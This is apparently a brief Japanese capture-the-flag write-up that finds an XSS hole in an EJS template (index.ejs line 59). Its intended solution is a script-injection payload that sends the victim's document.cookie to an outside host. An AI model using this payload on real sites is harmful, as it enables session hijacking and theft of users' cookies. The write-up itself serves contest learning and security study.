# Onomancy-Oriented Programming

[app/views/index.ejs#L59](dist/app/views/index.ejs#L59) に unescaped string を放り込める箇所がありXSS可能な脆弱性があるので、適当にscriptタグを放り込むと動く。

* [EJS -- Embedded JavaScript templates](https://ejs.co/#docs)

## 想定解

`"><script>location.href = "http://xss.hkt.sh/" + document.cookie</script>`
